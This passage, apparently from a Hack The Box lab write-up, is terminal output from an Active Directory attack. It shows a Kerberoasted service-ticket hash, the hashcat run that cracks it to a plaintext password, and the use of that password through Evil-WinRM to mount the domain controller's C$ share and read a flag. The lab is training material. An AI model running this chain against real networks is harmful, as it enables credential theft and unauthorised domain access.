                       84140FE2D4EDEA70705DBDA4D0748422AEF95964CA1962F9F8A3D3260450C34B377D70AA9B9F476B8BA6F7F3BF436B38   

                       BD2E700F20A4138F21FEBAC54794B18B83E7C7509EEAFD852E391E850815EE5062CD78B475081F0C7D323C5C2103C6E4   

                       3F38169F38DE6F00656A52407520F68E1EE6693A36CB4582BD2353A0B6E95641D35017584B788017F331336476403EBD   

                       E342C6CD91AB43FCAF6BDF3570F4A95714F49413AF65205D3CCA1AC806207DB5B29D78015137CE91B466F485BA029F87   

                       3BA8448291F76FE3173E13AB2FF47F1F19A746B1FB93B6EEBA444450F15495C288FC6A6F7DFF16C3EFAAF5D3F999E116   

                       898DA8CC0B2BBCC2DC22F7A693FEB90EFA739EF26D5725C4503FCDBC07C24CE5BB0047EDF4660375BC4CA1513D43B01B   

                       B79DA10899602284A5CFE6C59492F79092BA6258D5B3C029909C8A50D344AC304873F601A8A3D39E51C6C8DC440032AA   

                       144F00A46E2457351674B1C1E130916A595B17E020DDE7124BA28FCAFACB9DE4C258F38A67922A1F5021E3B8409782DD   

                       8A0FF7BFEA6A2BF4676E1DC8E1EC20E3E7A6E435935A5EDA115B0B181A73BB4A14580A9E5A1AE5C2EE2B31614CF33352   

                       6ECB529160D9697B5179F5DE8A8B7B56DC3CA0B20B1D2C542E939C756F368D601D5BE6597D43DC51B4E08098F564FAA1   

                       ACCEB408295B396B0E6CC54E3EA18AC90A6C57BE1BBB6B5A586B836B6FB166B37EBA64831379F5C2723EA309594F8611   

                       890E2CB994751C044B19BAED9C740F8D157092408AB6AC157869E53F7AE83CC94590D2D86D66FB30201117F7992B6223   

                       19DAD7CCAAAA9E4290FCC0712E3A574779A34E480808178FE4B47B34EA3DFFF2AEDD55997EBCE30837E803ED3F66E30E   

                       DAB7F8592323DD761C1DAE7094627B09BC70678A10401B90CDCE005BF0353D5E21FB65C944CBC56A1BDBB31A2FC566E3   

                       582D9970FAE823F477689790A3616DF715DA961DE2B1848B2F3980E9371A60A07CBF5D54990AA55B551ADF0E758A4766   

                       36019AF3954F5198BB3B29B183EAA7F11959FCD2B63D91090B8CF752A877025CA4DD97CFF0EEE0448DF9A48A8C14ED1B   

                       827E6209319FA51234966F4BDEEB2ABFF0AD11AF409A590882928A8460DB91723AA6DD9D1E8A97D8A5BF063927FDF9C8   

                       6E17032EA7B7F1BED8BD924899255911AAB7757167D77F81ABC74DA91B582644BE8007203C013BFB85AE640C456   

SamAccountName       : p00_adm                                                     

DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo                      

ServicePrincipalName : cyber_audit/intranet.poo:443                                

NULL                                                                               

NULL                                                                               

NULL                                                                               

NULL
```

```
msplmee@kali:~/HTB/Endgames/P.O.O$ hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/seclists/Passwords/Keyboard-Combinations.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/seclists/Passwords/Keyboard-Combinations.txt
* Passwords.: 9604
* Bytes.....: 84476
* Keyspace..: 9604
* Runtime...: 0 secs

$krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$5c68d2deddb5a921c7dd69a2d230d1d6$1883c5839b7f0ee5cc513a27d23404f26e5b1ab7423220caae3882717bb1302a60a41dddb86d8c006500d5d0f46992ec656d884fa5049a8cd436c7b6778702fbf108fe6d7e4809ba4d4b1699f029e48167ad888de4005e9ae18bdc5a96cae01f3e3b8aa526b78867a550f8395be9d003fbdf7a8895af626bcfcc5f798d5931ccec59e58fd69e98e5e44cfdb271a64fd4b3705b6f0db8a6592972949105373d565c54063f0843c9007cea27cb329432ea4b5df64afa1bb8051f8d282c725b89c84140fe2d4edea70705dbda4d0748422aef95964ca1962f9f8a3d3260450c34b377d70aa9b9f476b8ba6f7f3bf436b38bd2e700f20a4138f21febac54794b18b83e7c7509eeafd852e391e850815ee5062cd78b475081f0c7d323c5c2103c6e43f38169f38de6f00656a52407520f68e1ee6693a36cb4582bd2353a0b6e95641d35017584b788017f331336476403ebde342c6cd91ab43fcaf6bdf3570f4a95714f49413af65205d3cca1ac806207db5b29d78015137ce91b466f485ba029f873ba8448291f76fe3173e13ab2ff47f1f19a746b1fb93b6eeba444450f15495c288fc6a6f7dff16c3efaaf5d3f999e116898da8cc0b2bbcc2dc22f7a693feb90efa739ef26d5725c4503fcdbc07c24ce5bb0047edf4660375bc4ca1513d43b01bb79da10899602284a5cfe6c59492f79092ba6258d5b3c029909c8a50d344ac304873f601a8a3d39e51c6c8dc440032aa144f00a46e2457351674b1c1e130916a595b17e020dde7124ba28fcafacb9de4c258f38a67922a1f5021e3b8409782dd8a0ff7bfea6a2bf4676e1dc8e1ec20e3e7a6e435935a5eda115b0b181a73bb4a14580a9e5a1ae5c2ee2b31614cf333526ecb529160d9697b5179f5de8a8b7b56dc3ca0b20b1d2c542e939c756f368d601d5be6597d43dc51b4e08098f564faa1acceb408295b396b0e6cc54e3ea18ac90a6c57be1bbb6b5a586b836b6fb166b37eba64831379f5c2723ea309594f8611890e2cb994751c044b19baed9c740f8d157092408ab6ac157869e53f7ae83cc94590d2d86d66fb30201117f7992b622319dad7ccaaaa9e4290fcc0712e3a574779a34e480808178fe4b47b34ea3dfff2aedd55997ebce30837e803ed3f66e30edab7f8592323dd761c1dae7094627b09bc70678a10401b90cdce005bf0353d5e21fb65c944cbc56a1bdbb31a2fc566e3582d9970fae823f477689790a3616df715da961de2b1848b2f3980e9371a60a07cbf5d54990aa55b551adf0e758a476636019af3954f5198bb3b29b183eaa7f11959fcd2b63d91090b8cf752a877025ca4dd97cff0eee0448df9a48a8c14ed1b827e6209319fa51234966f4bdeeb2abff0ad11af409a590882928a8460db91723aa6dd9d1e8a97d8a5bf063927fdf9c86e17032ea7b7f1bed8bd924899255911aab7757167d77f81abc74da91b582644be8007203c013bfb85ae640c456:ZQ!5t4r

```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> net use \\DC.intranet.poo\C$ /u:intranet.poo\p00_adm 'ZQ!5t4r'
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir \\DC.intranet.poo\C$\Users\


    Directory: \\DC.intranet.poo\C$\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2018   1:20 AM                Administrator
d-----        3/15/2018  12:38 AM                mr3ks
d-----        9/18/2023   2:17 PM                p00_adm
d-r---       11/21/2016   3:24 AM                Public


*Evil-WinRM* PS C:\Users\Administrator\Documents> type \\DC.intranet.poo\C$\Users\mr3ks\Desktop\flag.txt
POO{1196ef8bc523f084ad1732a38a0851d6}
```
